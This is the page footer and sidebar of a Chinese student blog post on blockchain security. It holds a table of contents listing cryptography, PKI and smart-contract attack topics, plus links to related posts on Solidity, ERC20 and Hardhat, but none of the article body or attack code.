</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/0xMarch-food">March</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/01/09/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">http://example.com/2026/01/09/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">March</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a><a class="post-meta__tags" href="/tags/%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B/">大学课程</a></div><div class="post-share"><div class="social-share" data-image="/img/post14.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechatpay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechatpay.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/13/Web%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%EF%BC%88Java%EF%BC%89/" title="Web应用开发（Java）"><img class="cover" src="/img/post15.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Web应用开发（Java）</div></div><div class="info-2"><div class="info-item-1">概述Web 应用架构示意图◆Web 浏览器：就是你电脑 &#x2F; 手机上的 Chrome这些，是用户的 “窗口”。用户在浏览器里输入网址、点击按钮，就会向服务器发出 “请求”，等服务器处理完再接收 “响应” 并展示内容。◆红色防火墙：它是整个系统的 “保安”，所有进出的网络流量都要经过它检查。它会拦截恶意攻击（比如黑客的非法请求），只把合法的请求放行到后面的 Web 服务器，同时也保护内部服务器不被直接暴露在公网上。◆Web 服务器：网站服务器，负责接收浏览器的请求，然后把请求分发给对应的 Web 应用来处理。处理完后，再把结果打包成 “响应” 发回给浏览器。◆Web 应用：是具体干活的 “办事员”，比如处理用户登录、生成动态页面、计算课程成绩等。它们会根据需要去数据库里读写数据，完成业务逻辑。◆数据库：是系统的 “档案库”，用来存储用户信息、课程数据、交易记录等。Web 应用需要数据时就来这里查，有新数据时也存在这里。 浏览器和服务器之间一次完整的 HTTP 请求 - 响应过程访问过程：通过浏览器，请求IP地址或域名，返回网页（html代码）。Web服务器：一种软件或硬件系...</div></div></div></a><a class="pagination-related" href="/2025/12/27/%E6%95%B0%E6%8D%AE%E5%BA%93/" title="数据库"><img class="cover" src="/img/post13.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">数据库</div></div><div class="info-2"><div class="info-item-1">概述描述事物的符号记录称为数据，其特点是数据与其语义是不可分的。 四个基本概念◆数据库(Database，DB)：长期储存在计算机内有组织、可共享的大量数据的集合。◆数据库管理系统(Database ManagementSystem，DBMS)：位于用户与操作系统之间的一层数据管理软件。它和操作系统一样是计算机的基础软件，也是一类大型复杂的软件系统。◆数据库系统(DataBaseSystem，DBS)：引入数据库后的计算机系统。一般是指由数据库、数据库管理系统(及其应用开发工具)、应用系统和数据库管理员组成的存储、管理、处理和维护数据的系统。 数据库系统架构图（图源：March）   数据库的本质：它是由DBMS创建的逻辑数据集合，没有安装DBMS的话，电脑中不存在可被管理的数据库；只有通过安装的MySQL&#x2F;Oracle这种软件，才能在电脑的存储介质（硬盘、内存）上创建、存储和维护数据库。 一句话：先装MySQL（DBMS），再用它创建数据库，数据库是DBMS运行后产生的产物，而非电脑自带的内容。  数据管理技术数据管理是指对数据进行分类、组织、编码、存储、检索和维护。...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/10/23/ERC20/" title="ERC20"><img class="cover" src="/img/post6.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-23</div><div class="info-item-2">ERC20</div></div><div class="info-2"><div class="info-item-1">什么是ERC20？就是一份技术规范（一键发币模板）。2017年定稿。从此任何钱包交易所与DApp都不再需要为每个新代币进行定制开发，直接用这个模板就行。  EIP-20（全称为 Ethereum Improvement Proposal 20），也常被称为 “ERC-20 标准”（ERC 即 Ethereum Request for Comments，是 EIP 被社区接受后的正式名称）。它定义了 fungible token（可替代代币）的统一接口规范，让不同代币在以太坊网络中能被一致地交互和管理。  内容ERC20标准提供了name、symbol、decimals等元数据接口，用于描述代币的基本信息，如名称、符号和小数位数，方便用户识别和使用。 6个函数 总供应量  1function totalSupply() public view returns (uint256)  转账（从自己账户直接转移代币）  1function transfer(address _to, uint256 _value) public returns (bool success)  余额查询  ...</div></div></div></a><a class="pagination-related" href="/2025/10/23/HardHat/" title="HardHat框架"><img class="cover" src="/img/post5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-23</div><div class="info-item-2">HardHat框架</div></div><div class="info-2"><div class="info-item-1">开始安装并初始化12cd ...npx hardhat --init  使用 OpenZepplin 等第三方库： 1npm install @openzeppelin/contracts --save-dev  在合约里的体现： 1import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;  编译合约1npx hardhat compile  成功编译后，会在  artifacts/contracts/  目录下生成Name.json ，包含了智能合约的 ABI 、字节码（Bytecode）等。 运行测试12npx hardhat testnpx hardhat test &lt;文件名&gt;  其实我们在测试时， 合约已经部署到了 Hardhat 内置的网络上。 部署合约在scripts文件夹，新建一个deploy.js  用来写部署脚本。 12345678# 部署到Hardhat的「默认内置网络」npx hardhat run scripts/deploy.js# 本地部署npx hardhat ru...</div></div></div></a><a class="pagination-related" href="/2025/08/17/Solidity/" title="Solidity"><img class="cover" src="/img/post1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-17</div><div class="info-item-2">Solidity</div></div><div class="info-2"><div class="info-item-1">学习网站：Solidity 官方文档WTF 学院 代码框架123456// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract MyContract &#123;&#125; 第一行是SPDX许可证标识，用于声明该合约使用 MIT 开源许可证。在 Solidity 0.6.8 及以上版本中，推荐显式声明许可证，它告诉用户该合约的使用权限和限制。第二行pragma是 Solidity 中的关键字，用于指定编译器版本规则。 版本号在任何一个Solidity智能合约中，首先需要的就是Solidity的使用版本，它应该被标注在Solidity代码的最上面。  Solidity是一个更新频率很高的语言，和别的语言相比，它总会有新版本，所以我们需要告诉代码，要用哪个版本。   ^0.8.0（最常见的形式）：表示支持0.8.0及以上的版本（同 &gt;&#x3D; 0.8.0）。 0.8.22：表示只支持0.8.22版本。 &#x3D; 0.8.0 &lt;&#x3D; 0.9.0：表示支持0.8.0及以上0.9.0及以下的版...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">March</div><div class="author-info-description">Major in BlackChain | Web3 learner</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/0xMarch-food"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客，这里是对自己一些学习内容的记录，欢迎探讨指正！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">密码学基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%AF%86%E9%92%A5"><span class="toc-number">3.</span> <span class="toc-text">关于密钥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E9%92%A5%E7%9A%84%E7%B1%BB%E5%9E%8B%E5%92%8C%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84"><span class="toc-number">3.1.</span> <span class="toc-text">密钥的类型和组织结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%E6%8A%80%E6%9C%AF"><span class="toc-number">3.2.</span> <span class="toc-text">密钥管理技术</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%B8%8E%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF"><span class="toc-number">4.</span> <span class="toc-text">数字签名与认证技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">哈希函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D"><span class="toc-number">4.2.</span> <span class="toc-text">数字签名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6"><span class="toc-number">4.3.</span> <span class="toc-text">数字证书</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF"><span class="toc-number">4.4.</span> <span class="toc-text">认证技术</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PKI%E6%8A%80%E6%9C%AF"><span class="toc-number">5.</span> <span class="toc-text">PKI技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PKI%E7%B3%BB%E7%BB%9F"><span class="toc-number">5.1.</span> <span class="toc-text">PKI系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="toc-number">5.2.</span> <span class="toc-text">数字证书的认证过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A4%E5%8F%89%E8%AE%A4%E8%AF%81"><span class="toc-number">5.3.</span> <span class="toc-text">交叉认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PKI%E5%BA%94%E7%94%A8"><span class="toc-number">5.4.</span> <span class="toc-text">PKI应用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF"><span class="toc-number">6.</span> <span class="toc-text">网络攻击与防御技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92"><span class="toc-number">6.1.</span> <span class="toc-text">计算机病毒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.2.</span> <span class="toc-text">漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F"><span class="toc-number">6.3.</span> <span class="toc-text">扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%97%85%E6%8E%A2%E6%96%B9%E6%B3%95"><span class="toc-number">6.4.</span> <span class="toc-text">嗅探方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%8F%8A%E9%98%B2%E8%8C%83%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF"><span class="toc-number">7.</span> <span class="toc-text">恶意代码及防范技术与漏洞挖掘技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">7.1.</span> <span class="toc-text">恶意代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E-1"><span class="toc-number">7.2.</span> <span class="toc-text">漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">8.</span> <span class="toc-text">区块链攻击与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B1%E8%AF%86%E5%B1%82%E6%94%BB%E5%87%BB"><span class="toc-number">8.1.</span> <span class="toc-text">共识层攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82%E6%94%BB%E5%87%BB"><span class="toc-number">8.2.</span> <span class="toc-text">网络层攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E5%B1%82%E6%94%BB%E5%87%BB"><span class="toc-number">8.3.</span> <span class="toc-text">合约层攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%90%E7%A7%81%E5%A8%81%E8%83%81%E4%BF%9D%E6%8A%A4"><span class="toc-number">9.</span> <span class="toc-text">隐私威胁保护</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86"><span class="toc-number">9.1.</span> <span class="toc-text">同态加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E"><span class="toc-number">9.2.</span> <span class="toc-text">零知识证明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E7%AD%BE%E5%90%8D%E6%8A%80%E6%9C%AF"><span class="toc-number">9.3.</span> <span class="toc-text">环签名技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E7%A7%81%E5%A8%81%E8%83%81"><span class="toc-number">9.4.</span> <span class="toc-text">隐私威胁</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%A7%E4%B8%80%E9%93%BE%E5%AE%89%E6%BC%8F%E6%B4%9E%E4%BA%86%E8%A7%A3"><span class="toc-number">10.</span> <span class="toc-text">大一链安漏洞了解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%88Reentrancy%EF%BC%89"><span class="toc-number">10.1.</span> <span class="toc-text">1.重入攻击（Reentrancy）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">10.1.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E6%A1%88%E4%BE%8B"><span class="toc-number">10.1.2.</span> <span class="toc-text">典型案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">10.1.3.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%A2%84%E9%98%B2%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-number">10.1.4.</span> <span class="toc-text">如何预防重入攻击？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB"><span class="toc-number">10.2.</span> <span class="toc-text">2.整数溢出攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-1"><span class="toc-number">10.2.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E6%A1%88%E4%BE%8B-1"><span class="toc-number">10.2.2.</span> <span class="toc-text">典型案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-1"><span class="toc-number">10.2.3.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%EF%BC%9F"><span class="toc-number">10.2.4.</span> <span class="toc-text">如何防御？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%BB%B7%E6%A0%BC%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BB"><span class="toc-number">10.3.</span> <span class="toc-text">3.价格操纵攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-2"><span class="toc-number">10.3.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">10.3.2.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%EF%BC%9F-1"><span class="toc-number">10.3.3.</span> <span class="toc-text">如何防御？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"><span class="toc-number">10.4.</span> <span class="toc-text">4.权限控制漏洞攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-3"><span class="toc-number">10.4.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-2"><span class="toc-number">10.4.2.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%9F%AD%E5%9C%B0%E5%9D%80%E6%94%BB%E5%87%BB"><span class="toc-number">10.5.</span> <span class="toc-text">5.短地址攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-number">10.5.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-3"><span class="toc-number">10.5.2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%A2%84%E9%98%B2%EF%BC%9F"><span class="toc-number">10.5.3.</span> <span class="toc-text">如何预防？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%A7%94%E6%89%98%E8%B0%83%E7%94%A8-delegatecall"><span class="toc-number">10.6.</span> <span class="toc-text">6.委托调用(delegatecall)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-number">10.6.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-4"><span class="toc-number">10.6.2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%A2%84%E9%98%B2%EF%BC%9F-1"><span class="toc-number">10.6.3.</span> <span class="toc-text">如何预防？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E6%9C%AA%E5%88%9D%E5%A7%8B%E5%8C%96%E5%AD%98%E5%82%A8%E6%8C%87%E9%92%88%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.7.</span> <span class="toc-text">7.未初始化存储指针漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-number">10.7.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-5"><span class="toc-number">10.7.2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%A2%84%E9%98%B2%EF%BC%9F-2"><span class="toc-number">10.7.3.</span> <span class="toc-text">如何预防？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E7%AF%A1%E6%94%B9%E6%94%BB%E5%87%BB%E3%80%82"><span class="toc-number">10.8.</span> <span class="toc-text">8.前端代码篡改攻击。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F"><span class="toc-number">10.8.1.</span> <span class="toc-text">传统</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-1"><span class="toc-number">10.8.1.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%89%B9%E7%82%B9"><span class="toc-number">10.8.1.2.</span> <span class="toc-text">攻击特点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE"><span class="toc-number">10.8.2.</span> <span class="toc-text">区块链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-2"><span class="toc-number">10.8.2.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E6%A1%88%E4%BE%8B-2"><span class="toc-number">10.8.2.2.</span> <span class="toc-text">典型案例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">10.8.2.3.</span> <span class="toc-text">攻击流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%EF%BC%9F-2"><span class="toc-number">10.8.2.4.</span> <span class="toc-text">如何防御？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-DDoS-%E6%94%BB%E5%87%BB"><span class="toc-number">10.9.</span> <span class="toc-text">9.DDoS 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F-1"><span class="toc-number">10.9.1.</span> <span class="toc-text">传统</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-3"><span class="toc-number">10.9.1.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%89%B9%E7%82%B9-1"><span class="toc-number">10.9.1.2.</span> <span class="toc-text">攻击特点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE-1"><span class="toc-number">10.9.2.</span> <span class="toc-text">区块链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-4"><span class="toc-number">10.9.2.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E6%A1%88%E4%BE%8B-3"><span class="toc-number">10.9.2.2.</span> <span class="toc-text">典型案例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC-6"><span class="toc-number">10.9.2.3.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%EF%BC%9F-3"><span class="toc-number">10.9.2.4.</span> <span class="toc-text">如何防御？</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/17/Solidity/" title="Solidity">Solidity</a><time datetime="2026-02-13T12:50:34.559Z" title="更新于 2026-02-13 20:50:34">2026-02-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/13/HTML+CSS/" title="HTML+CSS">HTML+CSS</a><time datetime="2026-02-13T12:41:36.098Z" title="更新于 2026-02-13 20:41:36">2026-02-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/13/Web%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%EF%BC%88Java%EF%BC%89/" title="Web应用开发（Java）">Web应用开发（Java）</a><time datetime="2026-01-14T05:56:18.947Z" title="更新于 2026-01-14 13:56:18">2026-01-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/post14.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By March</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (true) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
  }

